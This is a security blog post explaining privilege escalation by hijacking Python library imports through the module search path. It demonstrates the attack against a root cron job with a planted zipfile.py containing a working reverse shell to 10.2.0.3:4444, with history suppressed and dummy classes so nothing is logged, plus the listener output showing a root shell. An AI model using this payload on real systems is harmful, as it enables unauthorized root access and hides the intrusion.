---
layout: post
title: Privilege Escalation via Python Library Hijacking
date: 2017-09-11
categories:
  - security
  - websec
tags:
  - python
  - privilege escalation
  - privesc
  - library hijack
---
Whilst debugging a Python script today, I found that I was unable to execute it, with the stack trace pointing back to the import of the requests library.

```
Traceback (most recent call last):
  File "enum.py", line 1, in <module>
    import requests
  File "/usr/local/lib/python2.7/dist-packages/requests/__init__.py", line 84, in <module>
    from urllib3.contrib import pyopenssl
  File "/usr/local/lib/python2.7/dist-packages/urllib3/contrib/pyopenssl.py", line 46, in <module>
    import OpenSSL.SSL
  File "/usr/lib/python2.7/dist-packages/OpenSSL/__init__.py", line 8, in <module>
    from OpenSSL import rand, crypto, SSL
  File "/usr/lib/python2.7/dist-packages/OpenSSL/rand.py", line 11, in <module>
    from OpenSSL._util import (
  File "/usr/lib/python2.7/dist-packages/OpenSSL/_util.py", line 6, in <module>
    from cryptography.hazmat.bindings.openssl.binding import Binding
  File "/usr/local/lib/python2.7/dist-packages/cryptography/hazmat/bindings/openssl/binding.py", line 13, in <module>
    from cryptography.exceptions import InternalError
  File "/usr/local/lib/python2.7/dist-packages/cryptography/exceptions.py", line 7, in <module>
    from enum import Enum
  File "/home/rastating/enum.py", line 3, in <module>
    requests.get()
AttributeError: 'module' object has no attribute 'get'
```

After a bit of following through, I found that as the script was named `enum.py`, it was taking precedence over a module named `enum` that the requests library was relying on / trying to import; thus creating a circular reference.

Further digging into this, revealed that Python has a list of search paths for its libraries; meaning there is an opportunity for privilege escalation depending on mis-configurations of the system and how it's users are using it.

The paths that come configured out of the box on Ubuntu 16.04, in order of priority, are:

* Directory of the script being executed
* /usr/lib/python2.7
* /usr/lib/python2.7/plat-x86_64-linux-gnu
* /usr/lib/python2.7/lib-tk
* /usr/lib/python2.7/lib-old
* /usr/lib/python2.7/lib-dynload
* /usr/local/lib/python2.7/dist-packages
* /usr/lib/python2.7/dist-packages

For other distributions, run the command below to get an ordered list of directories:

```bash
python -c 'import sys; print "\n".join(sys.path)'
```

If any of these search paths are world writable, it will impose a risk of privilege escalation, as placing a file in one of these directories with a name that matches the requested library will load that file, assuming it's the first occurrence.

For example, if we have a script that imports the `requests` library, and the `requests` library is stored in `/usr/local/lib/python2.7/dist-packages`. If we create a new file named `requests.py` and place it in any of the six directories that appear in the list above prior to `/usr/local/lib/python2.7/dist-packages`, it would result in the successful hi-jacking of that library.

Realistically speaking, the chances of the default search paths being writable are slim, unless someone with root privileges took some horrible shortcuts (not completely unimaginable).

The more likely scenario, is that someone will place a frequently accessed script in a directory that is world writable and remove write access on the file from all other users.

This may seem OK on the face of it - but due to how Python is searching for libraries, this would open it up for a user to inject their own arbitrary Python code into the application.

For example, let's say we have a web server, where `/var/www` is owned by `www-data` (not an unheard of configuration), which contains a `root` owned backup script, which is executed every *N* minutes by a cron job:

```shell_session
$ whoami
www-data

$ ls -la .
total 16
drwxr-xr-x  3 www-data www-data 4096 Sep 11 23:44 .
drwxr-xr-x 15 root     root     4096 Sep 11 23:40 ..
-rw-r--r--  1 root     root      353 Sep 11 23:44 backup.py
drwxr-xr-x  2 www-data www-data 4096 Sep 11 23:42 html

$ cat backup.py
#!/usr/bin/env python
import os
import zipfile

def zipdir(path, ziph):
    for root, dirs, files in os.walk(path):
        for file in files:
            ziph.write(os.path.join(root, file))

if __name__ == '__main__':
    zipf = zipfile.ZipFile('/var/backups/website.zip', 'w', zipfile.ZIP_DEFLATED)
    zipdir('/var/www/html', zipf)
    zipf.close()
```

As can be seen in the output above, `backup.py` cannot be altered by the low privilege account, `www-data`. However, as it is importing libraries (the `os` and `zipfile` libraries to be specific), we can gain privilege escalation by hi-jacking one of these libraries.

If we wanted to gain remote access, we could create a new file, as `www-data` in the same directory as `backup.py`, named `zipfile.py`, with the following content:

```python
import os
import pty
import socket

lhost = "10.2.0.3"
lport = 4444

ZIP_DEFLATED = 0

class ZipFile:
    def close(*args):
        return

    def write(*args):
        return

    def __init__(self, *args):
        return

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((lhost, lport))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
os.putenv("HISTFILE",'/dev/null')
pty.spawn("/bin/bash")
s.close()
```

Within this file, we have the code to gain a reverse shell (taken from [python-pty-shells](https://github.com/infodox/python-pty-shells/)), but also an additional dummy class and constant, to make the file compatible with the program that is calling it.

By adding the dummy class and constant, we ensure that no errors will be logged and that the calling program exits cleanly.

The next time the cron job runs, `backup.py` will load our version of the `zipfile` library, due to it appearing first in the search paths (as the current directory **always** comes first), and subsequently execute our payload with elevated privileges:

```shell_session
root@kali:~# ncat -v -l -p 4444
Ncat: Version 7.60 ( https://nmap.org/ncat )
Ncat: Generating a temporary 1024-bit RSA key. Use --ssl-key and --ssl-cert to use a permanent one.
Ncat: SHA-1 fingerprint: 0F4F BD69 EB85 CB0A 0663 CEDB 8A12 4110 CEDD 7412
Ncat: Listening on :::4444
Ncat: Listening on 0.0.0.0:4444
Ncat: Connection from 10.2.0.1.
Ncat: Connection from 10.2.0.1:52898.
root:/var/www# ls -la .
ls -la .
total 24
drwxr-xr-x  3 www-data www-data 4096 Sep 12 00:26 .
drwxr-xr-x 15 root     root     4096 Sep 11 23:40 ..
-rw-r--r--  1 root     root      353 Sep 11 23:44 backup.py
drwxr-xr-x  2 www-data www-data 4096 Sep 11 23:42 html
-rw-r--r--  1 www-data www-data  434 Sep 12 00:26 zipfile.py
-rw-r--r--  1 root     root     1097 Sep 12 00:26 zipfile.pyc
root:/var/www# id
id
uid=0(root) gid=0(root) groups=0(root)
root:/var/www#
```
